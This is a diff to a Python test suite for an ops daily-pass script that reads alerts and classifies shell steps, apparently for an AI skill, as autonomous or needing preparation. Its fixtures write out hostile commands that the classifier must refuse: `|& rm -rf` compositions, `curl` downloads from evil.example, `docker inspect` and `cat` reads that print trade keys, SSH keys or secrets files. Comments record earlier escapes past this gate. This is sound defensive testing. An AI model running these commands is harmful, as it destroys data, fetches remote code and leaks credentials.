@@ -1,11 +1,7 @@
 """TDD for `infra/scripts/ops_daily.py` — the daily pass's instrument.
 
-These are standalone scripts, not package modules, so they load via `spec_from_file_location`.
-Every fixture here is shaped to what the LIVE Grafana API actually returns, measured 2026-08-29:
-the rule uid is a top-level field, `labels` carry only `severity`, and no `__`-prefixed label
-exists. An earlier draft of this plan invented `labels.__a_uid__`; the fixtures were shaped to the
-invention, so every test passed while the pass would have matched no alert to any runbook.
-"""
+A standalone script, not a package module, so it loads via `spec_from_file_location`; every fixture
+here is shaped to what the live Grafana API returns, never to what the parser expects."""
 
 from __future__ import annotations
 
@@ -47,13 +43,7 @@ def _canned(*payloads):
 
 
 def _recording(*payloads):
-    """`_canned`, but it keeps the URLs it was asked for.
-
-    `_canned` never looks at the request, so every endpoint the instrument builds was
-    unasserted -- which is how a Prometheus query path shipped against a Loki datasource and
-    404'd on the first live run. A test that only feeds a payload back proves parsing and
-    nothing about where the payload would have come from.
-    """
+    """`_canned`, but it keeps the URLs it was asked for, so a test can assert the endpoint built."""
     urls: list[str] = []
     queue = list(payloads)
 
@@ -114,18 +104,17 @@ def test_the_rules_read_pairs_every_firing_instance_with_its_runbook_link():
     assert [a.uid for a in read.firing_now] == ["zcrypto-capture-stream-silent"]
     assert read.firing_now[0].runbook == "infra/runbooks/capture.md#zcrypto-capture-stream-silent"
     assert read.unreadable is None
-    # One Alert per RULE, but carrying every host that has a firing instance: the venue rules group
-    # `by (host, system)`, so one venue halt raises several instances per host, and the silence the
-    # runbook prescribes is created and deleted PER HOST. A reader who cannot enumerate the hosts
-    # cannot discharge that obligation. Deduped, so three instances over two hosts read as two.
+    # One Alert per RULE carrying every host with a firing instance, deduped: the venue rules group
+    # `by (host, system)`, and the silence the runbook prescribes is created and deleted PER HOST, so
+    # a reader who cannot enumerate the hosts cannot discharge that obligation.
     assert read.firing_now[0].hosts == ("zcrypto", "zcrypto-red")
     assert read.firing_now[0].active_at == "2026-08-29T10:00:00Z"
 
 
 def test_the_rules_read_lists_every_rule_whose_health_is_not_ok():
-    """A rule Grafana could not evaluate pages nothing -- `execErrState: OK` on the capture-silence
-    rules makes that deliberate -- so the daily pass is where it surfaces: every rule whose `health`
-    is anything but `ok` is listed with the error Grafana attached."""
+    """A rule Grafana could not evaluate pages nothing -- `execErrState: OK` makes that deliberate --
+    so the daily pass lists every rule whose `health` is set and not `ok`, with the error Grafana
+    attached; a rule carrying no `health` field and no `(Error)` instance is not a finding."""
     payload = _rules(
         {
             "name": "Capture · all streams silent",
@@ -168,10 +157,9 @@ def test_a_rule_set_that_is_all_ok_lists_nothing_unhealthy():
 
 
 def test_the_rules_read_lists_a_rule_whose_instances_carry_the_error_reason_while_its_health_reads_ok():
-    """The mode the read exists for: by ngalert's source, `execErrState: OK` maps a failed evaluation to
-    instance state `Normal (Error)` with rule-level `health: ok` and no `lastError`, so the `(Error)`
-    reason on an instance is the only trace that mode leaves (T0167's read-back saw the suffix shape
-    live, not that mapping). A NoData or MissingSeries reason is not an error."""
+    """An `(Error)` reason on an instance is unhealthy even where the rule's own `health` reads `ok`:
+    by ngalert's source that suffix is all `execErrState: OK` leaves of a failed evaluation (T0167's
+    read-back saw the shape live, not the mapping). A NoData or MissingSeries reason is not one."""
     payload = _rules(
         {
             "name": "Capture · all streams silent",
@@ -249,10 +237,9 @@ def test_an_unreachable_grafana_is_reported_never_read_as_nothing_firing():
     ],
 )
 def test_the_host_is_recovered_from_the_uid_when_the_rule_aggregates_it_away(uid, expected):
-    """These rules' own expr is `count(up{host="ops"}) or on() vector(0)`, so the firing instance
-    carries only `severity`. Without the map the pass cannot tell an Alloy restart that is routine
-    on ops from the same restart on the capture pair, which is attended -- and the two capture
-    entries are what a copy-paste breaks."""
+    """These rules' expr aggregates the host away -- `count(up{host="ops"}) or on() vector(0)` leaves
+    the firing instance carrying only `severity` -- so without `_UID_HOST` the pass cannot tell an
+    Alloy restart that is routine on ops from the same restart on the attended capture pair."""
     payload = _rules(
         {
             "name": "Alloy dark",
@@ -340,11 +327,9 @@ def test_no_series_is_a_verdict_failure_never_a_pass():
 
 @pytest.mark.parametrize(("value", "ok"), [("1", True), ("0", False)])
 def test_a_value_bearing_check_is_judged_on_its_VALUE_never_on_the_series_existing(value, ok):
-    """The empty-result fixture above cannot see a bound -- with no series a bounded and an unbounded
-    read both FAIL -- so only a value-bearing one separates them. `up` is 0, not absent, when Alloy is
-    running and the app it scrapes is dead; the capture role's own `config.alloy` says exactly that of
-    `engine_app` on the secondary. A presence-only check therefore prints PASS beside the one value
-    this check exists to catch."""
+    """A value-bearing check is judged on its VALUE: `up` is 0, not absent, when Alloy runs and the
+    app it scrapes is dead, so a presence-only check would print PASS beside the one value this
+    check exists to catch."""
     payload = {"data": {"result": [{"metric": {}, "value": [1, value]}]}}
     up = next(c for c in ops_daily.read_verdict("tok", opener=_canned(payload)) if c.name == "capture primary up")
     assert up.ok is ok
@@ -352,9 +337,8 @@ def test_a_value_bearing_check_is_judged_on_its_VALUE_never_on_the_series_existi
 
 
 def test_an_out_of_bound_age_fails_rather_than_reporting_its_number_as_a_pass():
-    """Every check whose name does not end `present` carries the bound of the rule that owns it, so
-    the pass cannot report PASS beside a value the fleet is already paging on: 99999 s of cycle age is
-    six times `zcrypto-engine-cycle-stale`'s own 16500."""
+    """A check whose name does not end `present` carries the bound of the rule that owns it, so the
+    pass cannot print PASS beside a value the fleet is already paging on."""
     payload = {"data": {"result": [{"metric": {}, "value": [1, "99999"]}]}}
     age = next(c for c in ops_daily.read_verdict("tok", opener=_canned(payload)) if c.name == "engine cycle age")
     assert not age.ok
@@ -464,8 +448,8 @@ def test_the_same_step_is_routine_on_ops_and_attended_on_the_capture_pair(host, 
     ],
 )
 def test_a_read_only_step_is_autonomous_even_naming_a_protected_object(text):
-    """Seven read verbs: a suite exercising two lets a classifier keyed on those two prepare every
-    logs, grep and journalctl step -- the halt-at-step-1 failure in a new place."""
+    """A read-only step is AUTONOMOUS even when it names a protected object: a classifier keyed on
+    the two commonest read verbs would prepare every other logs, grep and journalctl step."""
     assert ops_daily.classify_action(text, host="zcrypto") is ops_daily.Tier.AUTONOMOUS
 
 
@@ -481,23 +465,21 @@ def test_a_read_only_step_is_autonomous_even_naming_a_protected_object(text):
         "**The systemd journal**: `sudo journalctl --vacuum-size=200M`.",
         "`sudo docker exec zcrypto-engine zcrypto engine cycle --at 2026-08-29T12:00:00+00:00 --replace`",
         # ONE span, so the docker-exec payload is what decides: a two-span fixture would fail on the
-        # `ssh nas` span instead and pass for the wrong reason. Under the unsafe invention -- allowlist
-        # (docker, exec) and skip the stripping -- this is the case that comes back autonomous.
+        # `ssh nas` span instead and pass for the wrong reason.
         "`sudo /usr/local/bin/docker exec zcrypto-archive-pull rm /tmp/gate-cache.json`",
         "`ssh nas`, then `sudo /usr/local/bin/docker exec zcrypto-archive-pull rm /tmp/gate-cache.json`",
         "`sudo docker inspect zcrypto-engine`",
     ],
 )
 def test_a_mutating_or_unscoped_step_is_prepared_on_any_host(text):
-    """The dangerous half, pinned by name -- a pair of fixtures cannot reach it. The last case is
-    an UNSCOPED inspect: it prints the container's environment, which on the engine host is the
-    live trade key."""
+    """The dangerous half, pinned by name. The last case is an UNSCOPED inspect: it prints the
+    container's environment, which on the engine host is the live trade key."""
     assert ops_daily.classify_action(text, host="ops") is ops_daily.Tier.PREPARED
 
 
 def test_a_bare_command_with_no_backticks_is_judged_as_one_command():
-    """Every other fixture carries backticks, so "no span => PREPARED" would pass the whole suite
-    and then prepare everything at runtime -- the skill passes the command bare."""
+    """The skill passes the command bare, so a text carrying no backtick span is judged as one
+    command rather than refused for want of a span."""
     assert ops_daily.classify_action("sudo docker logs zcrypto-capture --since 1h", host="zcrypto") is ops_daily.Tier.AUTONOMOUS
 
 
@@ -541,11 +523,8 @@ _DESTRUCTIVE = (
 
 
 def _runbook_commands() -> list[str]:
-    """Every backtick span AND every fenced-block line that parses as a command.
-
-    The fenced blocks matter: engine.md's `cycle --at … --replace` lives in one, and a
-    backtick-only sweep never sees it.
-    """
+    """Every backtick span AND every fenced-block line that parses as a command -- engine.md's
+    `cycle --at … --replace` lives in a fenced block, invisible to a backtick-only sweep."""
     out, starters = (
         [],
         (
@@ -581,8 +560,7 @@ def _runbook_commands() -> list[str]:
 
 def test_no_runbook_command_carrying_a_destructive_token_is_ever_autonomous():
     """The guard against the verb nobody imagined: it does not matter WHICH allowlist entry lets a
-    command through, only that nothing destructive does. Both Criticals this classifier has already
-    had -- `journalctl --vacuum-size`, `docker exec … cycle --replace` -- fail this test."""
+    runbook command through, only that no command carrying a destructive token does."""
     offenders = [
         c
         for c in _runbook_commands()
@@ -613,10 +591,8 @@ def test_the_red_button_is_never_autonomous():
 
 
 # Every wrapping of the red button an operator or a runbook would really produce, each paired with a
-# read command wearing the SAME wrapper. The pair is the whole point: `is not AUTONOMOUS` is what a
-# classifier broken into refusing everything also answers, and it is what a typo in the button's
-# spelling answers too. The read half fails in both of those worlds, so only a live classifier
-# reading a command it genuinely parses can make a row pass.
+# read command wearing the SAME wrapper: without the read half, a classifier that refuses everything
+# -- or a typo in the button's spelling -- passes every row.
 _RED_BUTTON_WRAPPINGS = (
     ("sudo zcrypto-flatten", "sudo docker logs zcrypto-engine --since 1h"),
     ("sudo zcrypto-flatten --execute", "sudo docker logs zcrypto-engine --since 1h"),
@@ -632,16 +608,15 @@ _RED_BUTTON_WRAPPINGS = (
 
 @pytest.mark.parametrize(("button", "read"), _RED_BUTTON_WRAPPINGS)
 def test_no_wrapping_of_the_red_button_reaches_autonomous(button, read):
-    """The button is refused through every wrapper the fleet's commands are really spelled with --
-    the host wrapper, its absolute path, a one-off `docker exec` into the engine, an `ssh` that
-    retargets the host, and the in-container form with its state directory."""
+    """The button is refused through every wrapper `_RED_BUTTON_WRAPPINGS` spells it with, and the
+    read wearing the same wrapper stays AUTONOMOUS."""
     assert ops_daily.classify_action(f"`{button}`", host="zcrypto") is ops_daily.Tier.PREPARED
     assert ops_daily.classify_action(f"`{read}`", host="zcrypto") is ops_daily.Tier.AUTONOMOUS
 
 
 def test_the_classify_subcommand_is_what_the_skill_calls(capsys):
-    """The skill branches on this exit code. An incantation nobody runs is how a procedure's first
-    instruction silently rots -- this one did not exist until the plan's smoke step ran it."""
+    """The skill branches on this exit code -- an incantation nobody runs is how a procedure's first
+    instruction silently rots."""
     assert ops_daily.main(["classify", "--host", "ops", _ALLOY_RESTART]) == 0
     assert capsys.readouterr().out.strip() == "autonomous"
     assert ops_daily.main(["classify", "--host", "zcrypto", _ALLOY_RESTART]) == 3
@@ -676,22 +651,18 @@ def test_the_cli_names_both_subcommands_when_misused(capsys):
     ],
 )
 def test_shell_composition_and_write_shaped_reads_are_never_autonomous(cmd):
-    """Every one of these classified AUTONOMOUS before the whole-branch review, and each is a real
-    escape route rather than a hypothetical: a redirect into `exec/armed` ARMS the live venue
-    executor; a GET to a ping URL marks a dead-man alive, silencing the alarm; `{{json .Config}}`
-    prints the container's environment, which on the engine host is the Kraken trade key. The corpus
-    test cannot reach any of them -- no runbook contains a composition attack -- so they are pinned
-    here by construction."""
+    """Shell composition and write-shaped reads are PREPARED: a redirect into `exec/armed` arms the
+    live venue executor, a GET to a ping URL marks a dead-man alive, and `{{json .Config}}` prints
+    the engine's Kraken trade key -- no runbook contains such a command, so they are pinned here by
+    construction rather than by the corpus."""
     assert ops_daily.classify_action(cmd, host="zcrypto") is ops_daily.Tier.PREPARED
 
 
 @pytest.mark.parametrize(
     "cmd",
     [
-        # Operator SPELLINGS. `shlex(punctuation_chars=True)` emits each run of `();<>|&` as one
-        # token, and the parser generation denylisted five of them: `|&` pipes stdout+stderr and
-        # RUNS the second command, and all three `&>` forms redirect. Verified in real bash --
-        # `echo x |& rm -rf …` deleted the marker while the classifier called it a read.
+        # Operator SPELLINGS: `shlex(punctuation_chars=True)` emits each run of `();<>|&` as ONE
+        # token -- `|&` runs the second command, and all three `&>` forms redirect.
         "echo pwned |& rm -rf /tmp/probe_target",
         "echo x |& rm -rf /var/lib/zcrypto-capture",
         "echo x |& sudo systemctl restart zcrypto-engine",
@@ -699,9 +670,8 @@ def test_shell_composition_and_write_shaped_reads_are_never_autonomous(cmd):
         "echo pwned &> /tmp/probe_amp_redir",
         "echo pwned &>> /tmp/probe_amp_append",
         "cat /etc/hostname ;; rm -rf /tmp/x",
-        # Writes through an OPERAND, not a verb: `sort -o FILE` writes FILE, and uniq's second
-        # positional is its output file -- with no flag at all. These are why the flag-allowlist
-        # design was abandoned: no list of flags can catch a filename that is one by position.
+        # Writes through an OPERAND, not a verb -- `sort -o FILE`, and uniq's second positional is
+        # its output file -- so no list of flags can catch a filename that is one by position.
         "sort -o /tmp/probe_sort_out /etc/hostname",
         "uniq /etc/hostname /tmp/probe_uniq_out",
         "cat /etc/hostname | tee /tmp/probe_tee",
@@ -715,13 +685,8 @@ def test_shell_composition_and_write_shaped_reads_are_never_autonomous(cmd):
     ],
 )
 def test_the_round_three_escapes_are_refused(cmd):
-    """Each string here was AUTONOMOUS under the parser and mutates in real bash.
-
-    They are the reason the parser was replaced by an enumerated allowlist: three rounds each closed
-    one class and shipped the next. A shape absent from the table refuses by construction, so these
-    pass without anyone having imagined the verb -- but they are kept as fixtures because a guard is
-    unproven until the defect it names is seen to trip it.
-    """
+    """Each string mutates in real bash and is refused on every host -- kept as fixtures because a
+    guard is unproven until the defect it names is seen to trip it."""
     for host in ("zcrypto", "ops", "nas"):
         assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.PREPARED, host
 
@@ -737,12 +702,9 @@ def test_the_round_three_escapes_are_refused(cmd):
     ],
 )
 def test_the_wrappers_and_quoting_the_runbooks_really_use(cmd, host):
-    """The false-refusal side of the rewrite, at the four places it nearly broke.
-
-    The NAS spells docker `/usr/local/bin/docker`; a `--format` body and a grep pattern hold spaces,
-    so a stage must be tokenised quote-aware or it splits into nonsense; `docker exec <container>`
-    fronts a genuine read; and the repo's own query script takes PromQL full of braces and quotes.
-    """
+    """The runbooks' own spellings stay AUTONOMOUS: the NAS's absolute `/usr/local/bin/docker`, a
+    `--format` body or grep pattern holding spaces (so a stage must be tokenised quote-aware),
+    `docker exec` fronting a genuine read, and PromQL full of braces and quotes."""
     assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.AUTONOMOUS
 
 
@@ -776,11 +738,9 @@ def test_the_true_positives_still_pass(cmd):
 
 
 def test_an_alert_that_fired_and_resolved_overnight_reaches_the_report():
-    """The daily pass's core case: an alert that fired at 02:00 and cleared at 03:00 is invisible to
-    `firing_now` by the time the pass runs, so it must reach the report, the exit code and the
-    journal through `fired_in_window` -- otherwise a day whose only event self-resolved reads
-    all-clear over whatever it was. The frame's shape is measured against the live API: three
-    columns named by `schema.fields`, the rule identity in `line`, never in `labels`."""
+    """An alert that fired and cleared overnight is invisible to `firing_now`, so it must reach the
+    report, the exit code and the journal through `fired_in_window` -- or a day whose only event
+    self-resolved reads all-clear."""
     rules = _rules(
         {
             "name": "Capture · stream silent",
@@ -828,10 +788,9 @@ def test_an_alert_that_fired_and_resolved_overnight_reaches_the_report():
 
 
 def test_a_normal_instance_does_not_contribute_its_host_to_a_firing_rule():
-    """The rules API lists instances in EVERY state, not only the firing ones, and their states carry
-    a reason suffix the same way the history's do. A rule grouped `by (host, system)` can be Alerting
-    on the primary and Normal on the secondary, and naming both sends the operator to create a
-    silence on a host that never fired."""
+    """The rules API lists instances in EVERY state, so a rule grouped `by (host, system)` that is
+    Alerting on the primary and Normal on the secondary names only the primary -- naming both sends
+    the operator to create a silence on a host that never fired."""
     payload = _rules(
         {
             "name": "Capture · venue not online",
@@ -853,10 +812,9 @@ def test_a_normal_instance_does_not_contribute_its_host_to_a_firing_rule():
 
 @pytest.mark.parametrize("state", [None, "", "Normal"])
 def test_an_instance_the_api_does_not_call_alerting_contributes_no_host(state):
-    """Default-DENY on the instance's own state. The `[{}]` sentinel that stands in for a rule whose
-    expr aggregated every label away is restored after the filter, not smuggled through it as a
-    default -- otherwise any instance the code cannot prove is firing names its host anyway, which is
-    the defect the filter exists to close."""
+    """Default-DENY on the instance's own state: an instance the code cannot prove is firing names no
+    host, and the `[{}]` sentinel is restored after the filter rather than smuggled through it as a
+    default."""
     payload = _rules(
         {
             "name": "Capture · venue not online",
@@ -876,9 +834,7 @@ def test_an_instance_the_api_does_not_call_alerting_contributes_no_host(state):
 
 def test_a_firing_rule_that_arrives_with_no_instances_still_names_its_mapped_host():
     """The synthetic instance standing in for an empty `alerts` array must survive the state filter
-    that has no state to read, or `_UID_HOST` -- consulted per instance -- is never consulted at all.
-    Distinct from the rules that aggregate the host away: those DO carry an instance (pinned by the
-    test above), and reach the map through it."""
+    that has no state to read, or `_UID_HOST` -- consulted per instance -- is never consulted."""
     payload = _rules(
         {
             "name": "Alloy dark",
@@ -911,8 +867,8 @@ def _history(*transitions):
     ("current", "reaches"),
     [
         ("Alerting", True),
-        # 26 rules carry `noDataState: Alerting`; drill K measured the pair `Pending (NoData) ->
-        # Alerting (NoData)` off this endpoint. An exact match on "Alerting" drops every one of them.
+        # Drill K measured `Pending (NoData) -> Alerting (NoData)` off this endpoint, and these rules
+        # carry `noDataState: Alerting` deliberately, so an exact match on "Alerting" drops them.
         ("Alerting (NoData)", True),
         # `execErrState: Alerting` is Grafana failing to reach its own Prometheus -- 83.5% false over
         # 23 days by the capture runbook's count. Admitting it would move the verdict on a hiccup.
@@ -967,9 +923,8 @@ def test_a_history_alert_takes_the_host_from_its_own_labels():
 
 
 def test_a_history_alert_gathers_every_host_that_fired_not_just_the_first_row():
-    """One rule fires once per host, so the history carries a row each -- 2026-09-03's
-    `zcrypto-capture-all-streams-silent` transitioned on both capture hosts within the same minute.
-    Keeping the first row alone under-reports exactly as reading `instances[0]` did."""
+    """One rule fires once per host, so the history carries a row each: keeping the first row alone
+    under-reports a fleet-wide event exactly as reading `instances[0]` did."""
     rules = _rules(
         {
             "name": "Capture · every book stream on a host is silent",
@@ -1019,8 +974,8 @@ def test_an_alert_still_firing_is_not_also_listed_as_cleared():
         # find's siblings of -exec and -delete.
         r"find /var/log -execdir rm -rf {} \;",
         "find / -fprint /var/lib/foo/marker",
-        # A backslash-escaped quote: a naive scanner opens a quote span here and treats the real `;`
-        # as data. Verified against bash -- the `rm` runs.
+        # A backslash-escaped quote: a naive scanner opens a quote span here, treats the real `;` as
+        # data, and the `rm` runs.
         "echo \\' ; rm -rf /var/lib/foo",
         "echo \\' & rm -rf /var/lib/foo",
         # An unbalanced quote: bash refuses it, and so must the classifier rather than parsing on.
@@ -1028,10 +983,9 @@ def test_an_alert_still_firing_is_not_also_listed_as_cleared():
     ],
 )
 def test_flag_syntax_interpreters_and_escapes_cannot_launder_a_mutation(cmd):
-    """Thirteen strings that classified AUTONOMOUS after the first composition fix. Each is a real
-    escape route, and together they are why the flag lists are ALLOWLISTS per command and the lexer
-    is `shlex` rather than hand-rolled: a denylist of flags misses the attached form, and a
-    hand-rolled scanner loses to a backslash."""
+    """Flag syntax, an interpreter and an escape cannot launder a mutation -- the flag lists are
+    ALLOWLISTS per command because a denylist misses the attached form, and the lexer is `shlex`
+    because a hand-rolled scanner loses to a backslash."""
     assert ops_daily.classify_action(cmd, host="zcrypto") is ops_daily.Tier.PREPARED
 
 
@@ -1053,34 +1007,31 @@ def test_the_real_reads_survive_the_allowlists(cmd, host):
 @pytest.mark.parametrize(
     "cmd",
     [
-        # `curl -o` WRITES the file it names. Verified: the admitted string overwrote a seeded
-        # marker with example.com's HTML. It sat on the read path, which returns AUTONOMOUS before
-        # the protected-object veto runs -- so naming the unbackfillable capture dir did not stop it.
+        # `curl -o` WRITES the file it names, on the read path that returns AUTONOMOUS before the
+        # protected-object veto runs -- naming the unbackfillable capture dir does not stop it.
         "curl -o /var/lib/zcrypto-capture/x.parquet https://evil.example/p",
         "sudo curl -fsS -o /etc/zcrypto/zcrypto.toml https://evil.example/cfg",
         "curl -O https://evil.example/payload",
         "curl --output /tmp/x https://evil.example/p",
         # A Go template reaches the WHOLE object through a bare root reference, so allowlisting the
         # selectors a format mentions is unsound: `{{.Name}}` is safe and `{{json .}}` beside it
-        # marshals ContainerJSON. Verified against a container carrying a fake key -- it printed it.
+        # marshals ContainerJSON, environment included.
         "docker inspect --format '{{.Name}}{{json .}}' zcrypto-engine",
         'docker inspect --format \'{{.Id}}{{index . "Config" "Env"}}\' zcrypto-engine',
         "docker inspect --format '{{json .}}' zcrypto-engine",
         "docker inspect --format='{{.Name}}{{json .}}' zcrypto-engine",
         "docker inspect -f '{{.Name}}{{json .}}' zcrypto-engine",
         "docker inspect --format '{{range .Config.Env}}{{.}}{{end}}' zcrypto-engine",
-        # The classifier used to disagree with bash here: a raw replace turned this into
-        # `docker logs zcrypto-engine`, while bash reads a command `logs2` redirecting to a file.
+        # bash reads a command `logs2` redirecting to a file; a raw replace of the noise token turns
+        # it into `docker logs zcrypto-engine` and makes the classifier disagree with the shell.
         "docker logs2>/dev/nullzcrypto-engine",
         # A read that surfaces the trade key is the same defect `docker inspect` is guarded against.
         "cat /opt/zcrypto-capture/logship-secrets.env",
         "sudo cat /etc/zcrypto/secrets.env",
         "grep -r KRAKEN /opt/zcrypto-capture/logship-secrets.env",
         "cat infra/ansible/group_vars/all/vault.yml",
-        # Round five. The name-matching version of this veto passed every string above and still
-        # printed the Loki push password, because a glob and a directory carry no secret-shaped
-        # token -- the danger arrives through what the filter cannot name. These are the forms that
-        # matter; the literal-filename ones above never exercised the hole.
+        # A glob and a directory carry no secret-shaped token, so a name-matching veto prints the
+        # Loki push password through them while every literal filename above reads clean.
         "sudo cat /opt/zcrypto-capture/*",
         "sudo cat /etc/zcrypto-ops/alloy/*",
         "cat /home/deploy/.ssh/*",
@@ -1090,13 +1041,9 @@ def test_the_real_reads_survive_the_allowlists(cmd, host):
     ],
 )
 def test_the_round_four_escapes_are_refused(cmd):
-    """Both Criticals here lived in post-checks CARRIED OVER from the parser, not in the new table.
-
-    That is the lesson worth keeping: the enumerated shapes held under attack, and the two hand-written
-    predicates bolted onto them did not. A post-check that reasons about a command's arguments is the
-    old design surviving inside the new one, and it failed the same way -- by allowlisting what it
-    could name while the danger arrived through something it could not.
-    """
+    """Curl's writes, a Go template reaching the whole object, and a secret read through a glob or a
+    directory are PREPARED on every host -- the veto is an allowlist of WHERE a command may read,
+    never a denylist of secret-looking names."""
     for host in ("zcrypto", "ops", "nas"):
         assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.PREPARED, host
 
@@ -1125,13 +1072,9 @@ def test_the_round_four_escapes_are_refused(cmd):
     ],
 )
 def test_the_round_four_fixes_kept_their_true_positives(cmd, host):
-    """Each fix was cut to the exact shape of its defect, and this is what that bought.
-
-    `-o` admits `/dev/null` alone, so the dead-man liveness probe still runs; the format check
-    grammars the ACTIONS rather than banning `json`, so the runbooks' labelled multi-selector
-    formats still run; and the secret veto covers only heads that print file CONTENT, so `ls -la`
-    still answers the permission check on the secrets file it names.
-    """
+    """The narrow vetoes keep their true positives: `-o` admits `/dev/null` so the dead-man probe
+    still runs, the format check grammars the ACTIONS rather than banning `json`, and the secret veto
+    covers only heads that print file CONTENT, so `ls -la` still answers a permission check."""
     assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.AUTONOMOUS
 
 
@@ -1146,12 +1089,8 @@ def test_the_round_four_fixes_kept_their_true_positives(cmd, host):
     ],
 )
 def test_a_mutating_target_is_never_a_glob(cmd):
-    """One token that expands to many is the same defect as `cat <secretdir>/*`, on the write side.
-
-    A glob in a container or unit name turns one authorised telemetry restart into a mass one, and
-    nothing downstream re-checks what it expanded to. Reads keep their patterns -- the exact-unit
-    class is only on the mutating shapes -- so `systemctl list-timers 'zcrypto-*'` still runs.
-    """
+    """A glob in a mutating container or unit name turns one authorised restart into a mass one, and
+    nothing downstream re-checks what it expanded to."""
     assert ops_daily.classify_action(cmd, host="ops") is ops_daily.Tier.PREPARED
 
 
@@ -1173,14 +1112,10 @@ def test_the_read_patterns_the_exact_unit_class_must_not_break():
     ],
 )
 def test_a_read_safe_root_holds_only_what_was_checked(cmd):
-    """`/proc/` and `/sys/` were listed as inert without checking, and `/proc/` is not inert.
-
-    `cat /proc/<pid>/environ` prints a container's environment -- on the engine host the live Kraken
-    trade key, the one read CLAUDE.md names outright. `/etc/systemd/` was equally speculative: a
-    unit file can carry `Environment=` inline, so only journald's own config is listed. The last
-    case pins the prefix boundary: a root ending in `/` cannot be widened by a sibling that merely
-    starts with its letters.
-    """
+    """A read-safe root holds only what was checked: `cat /proc/<pid>/environ` prints the engine's
+    live Kraken trade key, and a unit file can carry `Environment=` inline, so only journald's own
+    config is listed -- and a root ending in `/` is not widened by a sibling that merely starts with
+    its letters."""
     assert ops_daily.classify_action(cmd, host="zcrypto") is ops_daily.Tier.PREPARED
 
 
@@ -1199,12 +1134,8 @@ def test_a_read_safe_root_holds_only_what_was_checked(cmd):
     ],
 )
 def test_grep_e_does_not_turn_the_first_file_into_the_pattern(cmd):
-    """The path check skips `grep`'s first operand as its pattern; `-e` moves the pattern elsewhere.
-
-    With `-e` value-taking, `grep -e X /etc/shadow` left the FILE at operand 0, where the skip threw
-    it away unchecked — and both seeded secrets printed. `-e` is a valueless short flag now, so the
-    pattern is always positional. The skip is only ever sound while that stays true.
-    """
+    """`grep -e X /etc/shadow` must stay PREPARED: the path check skips operand 0 as grep's pattern,
+    which is sound only while no flag can consume that pattern."""
     assert ops_daily.classify_action(cmd, host="zcrypto") is ops_daily.Tier.PREPARED
 
 
@@ -1227,13 +1158,9 @@ def test_the_greps_the_runbooks_actually_run():
     ],
 )
 def test_a_single_file_root_does_not_admit_names_that_extend_it(cmd):
-    """The three file entries were matched by `startswith`, so any longer name read clean.
-
-    Nothing on the fleet matched, which is what kept it latent — but `/etc/zcrypto-ops/alloy/` holds
-    alloy-secrets.env beside the compose file it lists, so a `compose.yaml.bak` there would have been
-    a door onto that directory. Files match exactly; only directory roots, all `/`-terminated, match
-    by prefix.
-    """
+    """A file root matches EXACTLY: `/etc/zcrypto-ops/alloy/` holds alloy-secrets.env beside the
+    compose file it lists, so a `compose.yaml.bak` admitted by prefix would be a door onto that
+    directory."""
     assert ops_daily.classify_action(cmd, host="ops") is ops_daily.Tier.PREPARED
 
 
@@ -1247,23 +1174,15 @@ def test_the_exact_file_roots_still_read():
 
 
 def test_every_directory_read_root_ends_in_a_slash():
-    """The split between prefix-matched dirs and exactly-matched files is only sound while it holds.
-
-    A `_READ_SAFE_DIRS` entry added without its trailing slash silently becomes a prefix again, and
-    admits every sibling whose name merely extends it — the defect the split was made to close. The
-    comment above the constant says so; this asserts it.
-    """
+    """A `_READ_SAFE_DIRS` entry added without its trailing slash silently becomes a prefix again and
+    admits every sibling whose name merely extends it -- so dirs end in `/` and files never do."""
     assert all(root.endswith("/") for root in ops_daily._READ_SAFE_DIRS), ops_daily._READ_SAFE_DIRS
     assert not any(f.endswith("/") for f in ops_daily._READ_SAFE_FILES), ops_daily._READ_SAFE_FILES
 
 
 def test_the_log_read_uses_lokis_query_path_not_prometheuss(monkeypatch):
-    """Loki answers under `/loki/api/v1/query`; `/api/v1/query` is Prometheus's and 404s there.
-
-    Measured against the live stack: the Prometheus spelling returned HTTP 404 and the Loki one
-    returned 200 with series. The whole suite was green while the log plane had never worked once,
-    because no test looked at the URL -- so this asserts the path, not the parse.
-    """
+    """Loki answers under `/loki/api/v1/query`; `/api/v1/query` is Prometheus's and 404s there, so
+    this asserts the path and the datasource uid, not the parse."""
     monkeypatch.delenv("GRAFANA_LOKI_DS_UID", raising=False)
     opener = _recording({"data": {"result": []}})
     ops_daily.read_logs("tok", window=DAY, opener=opener)
@@ -1292,13 +1211,9 @@ def test_the_prometheus_reads_keep_the_prometheus_query_path():
     ],
 )
 def test_a_transport_failure_is_an_unreadable_source_not_a_crash(exc):
-    """urllib wraps OSError only around the REQUEST, so these escape a `URLError`-only catch.
-
-    None of them can be produced by a fixture that returns a payload, which is why they survived
-    every green run: they need a real network. Uncaught, the 03:00 pass dies with a traceback and
-    Python exits 1 -- the ATTENTION code -- so an unreachable Grafana would have been reported as
-    a fleet finding rather than as the unreadable source it is, inverting the module's contract.
-    """
+    """urllib wraps `OSError` only around the REQUEST, so a transport failure below it escapes a
+    `URLError`-only catch and, uncaught, exits 1 -- ATTENTION -- for a source the pass could not
+    read, inverting the module's contract."""
     for read, kwargs in (
         (ops_daily.read_logs, {"window": DAY}),
         (ops_daily.read_alerts, {"now": NOW, "window": DAY}),
@@ -1310,13 +1225,9 @@ def test_a_transport_failure_is_an_unreadable_source_not_a_crash(exc):
 
 
 def test_a_verdict_read_that_could_not_be_read_exits_2_not_1():
-    """`read_verdict` reports through its checks, so its failures bypassed `Report.unreadable`.
-
-    An isolated timeout on the verdict query alone therefore exited 1 -- ATTENTION -- which says a
-    Grafana the pass could not reach is something wrong with the FLEET. The old assertion here was
-    `all(ok is False)`, which a healthy empty result satisfies identically and so proved nothing;
-    the `unreadable:` prefix is what distinguishes them.
-    """
+    """`read_verdict` reports through its checks, so a read it could not make must still reach
+    `Report.unreadable` and exit 2 -- an isolated timeout on the verdict query alone otherwise says
+    the FLEET is wrong."""
     checks = ops_daily.read_verdict("tok", opener=_raises(TimeoutError("timed out")))
     assert checks and all(c.value.startswith("unreadable:") for c in checks), checks
     report = ops_daily.build_report(
@@ -1349,11 +1260,7 @@ def test_a_healthy_but_empty_verdict_is_not_an_unreadable_source():
 
 
 def test_a_shape_changed_payload_is_an_unreadable_source_not_a_crash():
-    """A 200 whose body changed shape used to raise `KeyError` past the guard.
-
-    Both parses now sit inside their try. Uncaught, each left the pass at exit 1 -- attention -- for
